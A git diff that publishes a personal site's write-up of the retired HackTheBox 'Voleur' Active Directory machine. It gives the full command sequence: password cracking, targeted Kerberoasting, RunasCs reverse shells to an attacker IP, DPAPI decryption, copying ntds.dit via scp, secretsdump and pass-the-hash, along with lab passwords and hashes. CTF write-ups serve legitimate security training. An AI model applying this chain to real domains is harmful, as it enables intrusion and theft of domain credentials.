@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Voleur - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Voleur.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Voleur machine from HackTheBox - Medium difficulty level">
+    <meta name="description" content="Detailed writeup for Voleur machine from HackTheBox - Medium difficulty level">
     <meta name="keywords" content="HackTheBox, Voleur, Medium, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,126 @@
         <h1 class="writeup-title">Voleur</h1>
         <div class="writeup-metadata">
             <span class="difficulty medium">Medium</span>
-            <span class="date">Active machine</span>
+            <span class="date">November 1, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Voleur" src="../images/Voleur/pwned.png" /></p>
-<p>Voleur is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Voleur retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwne" src="../images/Voleur/pwned.png" /></p>
+<p>Voleur was a medium-difficulty Windows box centered around Active Directory exploitation in an NTLM-disabled environment, requiring exclusive use of Kerberos authentication throughout the attack chain.
+Initial enumeration revealed standard Active Directory services on a domain controller with an unusual SSH service on port 2222.
+Using credentials for ryan.naylor (HollowOct31Nyt), I encountered STATUS_NOT_SUPPORTED errors due to disabled NTLM authentication. I pivoted to impacket-smbclient with Kerberos authentication to enumerate SMB shares, discovering a password-protected Excel file (Access_Review.xlsx) in the IT share.
+After extracting the hash with office2john and cracking it with John the Ripper (password: football1), I obtained credentials for multiple service accounts.</p>
+<p>Using the svc_ldap account, I performed enumeration with bloodyAD and discovered write permissions on the servicePrincipalName attribute of svc_winrm.
+I exploited this through targeted Kerberoasting by adding an arbitrary SPN to svc_winrm, requesting a TGS ticket with impacket-GetUserSPNs, and cracking the hash with hashcat to obtain credentials (AFireInsidedeOzarctica980219afi).This provided WinRM access and the user flag.</p>
+<p>Privilege escalation leveraged svc_ldap's membership in the Restore group. Using RunasCs to get a shell as svc_ldap, I identified and restored the deleted Active Directory user Todd Wolfe using PowerShell's Restore-ADObject cmdlet.
+Accessing the IT share as Todd revealed an archived user directory in Second-Line Support containing DPAPI credential blobs and masterkeys. I decrypted the masterkey using impacket-dpapi with Todd's password and SID, then extracted credentials for jeremy.combs (qT3V9pLXyN7W4m) from the credential blob.</p>
+<p>As Jeremy, I discovered an SSH private key (id_rsa) and a note indicating WSL configuration for backup tools. I used the key to SSH as svc_backup on port 2222, accessing a Windows Subsystem for Linux environment.
+Through the /mnt/c mount point, I accessed the Third-Line Support backup directory containing ntds.dit and registry hives. After exfiltrating these files via SCP, I performed a local secretsdump to extract the Administrator's NTLM hash.
+Finally, I used impacket-getTGT with pass-the-hash to obtain a Kerberos ticket and achieved domain administrator access via WinRM, capturing the root flag.</p>
+<h1>User flag</h1>
+<p><img alt="nmap" src="../images/Voleur/nmap.png" /></p>
+<p>Nmap scan reveals standard ports for an Active Directory DC, and an unusual SSH on port 2222.</p>
+<h2>Finding an XLSX file in the IT share</h2>
+<p>Running nxc commands as Ryan returns a <code>STATUS_NOT_SUPPORTED</code> error, which means that NTLM authentication is disabled for this user.</p>
+<p>I requested a TGT using impacket-getTGT to bypass that issue. (Note to self from the future: Kerberos auth does NOT require having a pre-requested TGT.)</p>
+<p><code>impacket-getTGT -dc-ip 10.129.103.125 voleur.htb/ryan.naylor:HollowOct31Nyt</code></p>
+<p><img alt="failure" src="../images/Voleur/failure.png" /></p>
+<p>But it kept throwing more errors. I decided to switch my approach and use impacket-smbclient to quickly see if there are any accessible shares.</p>
+<p><code>impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@DC.voleur.htb</code></p>
+<p><img alt="xlsx" src="../images/Voleur/xlsx.png" /></p>
+<h3>Cracking the XLSX file password</h3>
+<p><img alt="password" src="../images/Voleur/password.png" /></p>
+<p>The file is password-protected. I'll use office2john to get a crackable hash.</p>
+<p><code>office2john Access_Review.xlsx</code></p>
+<p>It returns <code>Access_Review.xlsx:$office$&lt;SNIP&gt;</code>. I will attempt to crack this hash with John.</p>
+<p><code>john xlsxhash --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="crack" src="../images/Voleur/crack.png" /></p>
+<p><code>xlsx | football1</code></p>
+<p><img alt="sheet" src="../images/Voleur/sheet.png" /></p>
+<p>There are a few service accounts with passwords. I will check whether any of them are valid, and if yes, I'll check the user's permissions.</p>
+<h2>Targeted kerberoast against svc_winrm</h2>
+<p>I began with the svc_ldap user. I requested a ticket like before, and ran bloodyAD to check what they can do.</p>
+<p><code>bloodyAD --host DC.voleur.htb -k --dc-ip 10.129.103.125 get writable --detail</code></p>
+<p><img alt="write" src="../images/Voleur/write.png" /></p>
+<p>Svc LDAP can write into the servicePrincipalName attribute of svc winrm. This allows me to perform a <code>targeted kerberoast</code> to get a crackable hash.</p>
+<p>There will be two steps to that. First, I'll add an SPN to the svc_winrm account, then I'll use impacket-GetUserSPNs to request a hash.</p>
+<p><code>bloodyAD --host DC.voleur.htb -k --dc-ip 10.129.103.125 set object svc_winrm servicePrincipalName -v 'something/special'</code></p>
+<p>The value itself doesn't matter. It just has to be in the correct format.</p>
+<p><img alt="success" src="../images/Voleur/success.png" /></p>
+<p>Now I can request a ticket for this user.</p>
+<p><code>impacket-GetUserSPNs -target-domain voleur.htb -request  -k -no-pass -dc-ip 10.129.103.125 -dc-host DC.voleur.htb voleur.htb/svc_ldap</code></p>
+<p><img alt="ticket" src="../images/Voleur/ticket.png" /></p>
+<p>I will use hashcat to crack the password.</p>
+<p><code>hashcat -a 0 hash /usr/share/wordlists/rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/Voleur/cracked.png" /></p>
+<p><code>svc_winrm | AFireInsidedeOzarctica980219afi</code></p>
+<p>I'll request a ticket again, this time for svc_winrm. Then I will try remoting into the machine.</p>
+<p><code>impacket-getTGT -dc-ip 10.129.103.125 voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi</code></p>
+<p><img alt="export" src="../images/Voleur/export.png" /></p>
+<p><img alt="user" src="../images/Voleur/user.png" /></p>
+<h1>Root flag</h1>
+<h2>Restoring Todd Wolfe</h2>
+<p><img alt="bloodhound" src="../images/Voleur/bloodhound.png" /></p>
+<p>Since svc_ldap is in the restore group, I'll get a shell as them on the box to hopefully restore Todd. I will use RunasCs for this task, as the LDAP account cannot winrm into the machine.</p>
+<p><code>.\RunasCs.exe  svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.16.31:9001</code></p>
+<p><img alt="ldap" src="../images/Voleur/ldap.png" /></p>
+<p>This will be exactly the same as in the TombWatcher box. I need to get the deleted user's identity, then restore it with powershell. I already have their password from the XLSX file.</p>
+<p><code>Get-ADObject -Filter 'isDeleted -eq $True' -IncludeDeletedObjects -Properties *</code></p>
+<p><img alt="deleted" src="../images/Voleur/deleted.png" /></p>
+<p>Todd's identity as a deleted user is <code>CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb</code>.</p>
+<p><code>Restore-ADObject -Identity 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'</code></p>
+<p><img alt="restore" src="../images/Voleur/restore.png" /></p>
+<p>Todd has been restored. I can now request tickets as him, or get a reverse shell the same way as before.</p>
+<h2>Uncovering DPAPI credentials in Todd's user directory</h2>
+<p><code>.\RunasCs.exe  todd.wolfe NightT1meP1dg3on14 powershell.exe -r 10.10.16.31:9002</code></p>
+<p><img alt="todd" src="../images/Voleur/todd.png" /></p>
+<p>I will examine the IT share further, as I saw more directories that were inaccessible to me earlier.</p>
+<p>Second-Line Support contains an archived user directory of todd.wolfe.</p>
+<p><img alt="dpapi" src="../images/Voleur/dpapi.png" /></p>
+<p>In which I found a DPAPI blob, alongside Todd's masterkey. I used Copy-Item to copy both of those into C:\programdata, so that I can download them easily with my evil-winrm shell.</p>
+<p><img alt="files" src="../images/Voleur/files.png" /></p>
+<p>With both files on my machine, I can proceed with the decryption process. First, the masterkey.</p>
+<p><code>impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14</code></p>
+<p><img alt="masterkey" src="../images/Voleur/masterkey.png" /></p>
+<p>With this decrypted masterkey I can now get the credentials from the blob.</p>
+<p>`impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb<SNIP>``</p>
+<p><img alt="jeremy" src="../images/Voleur/jeremy.png" /></p>
+<p><code>jeremy.combs | qT3V9pLXyN7W4m</code></p>
+<p>I'll request a ticket like before, and I'll try remoting into the machine as Jeremy.</p>
+<p><img alt="files1" src="../images/Voleur/files1.png" /></p>
+<h2>SSH as svc_backup</h2>
+<pre class="codehilite"><code>Jeremy,
+
+I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
+
+Please see what you can set up.
+
+Thanks,
+
+Admin
+</code></pre>
+
+<p>There was also an id_rsa file, and I remember SSH running on port 2222. I'll check whether I can use SSH as <code>svcbackup</code>.</p>
+<p><code>ssh -i id_rsa svc_backup@voleur.htb -p 2222</code></p>
+<p><img alt="ssh" src="../images/Voleur/ssh.png" /></p>
+<p>I looked around the common valuable directories, and found the backups in <code>/mnt/c</code>.</p>
+<p><img alt="backups" src="../images/Voleur/backups.png" /></p>
+<p>I can now traverse the backup folder, which contains the hives and the ntds.dit file. If I get these, I'll be able to use secretsdump to get the hashes of every domain user, including the administrator.</p>
+<pre class="codehilite"><code>scp -P 2222 -i id_rsa svc_backup@voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' .
+
+scp -P 2222 -i id_rsa svc_backup@voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/Registry/SYSTEM' .
+</code></pre>
+
+<p><img alt="download" src="../images/Voleur/download.png" /></p>
+<p>Now I'll use these two files to perform a local secretsdump.</p>
+<p><code>impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</code></p>
+<p><img alt="hashes" src="../images/Voleur/hashes.png" /></p>
+<p>The admin's hash was revealed, but I <em>still</em> cannot use it to log in with evil-winrm due to NTLM auth being disabled. I will request a ticket one last time.</p>
+<p><code>impacket-getTGT -hashes ':e656e07c56d831611b577b160b259ad2' -no-pass -dc-ip 10.129.125.2 voleur.htb/administrator</code></p>
+<p><img alt="root" src="../images/Voleur/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
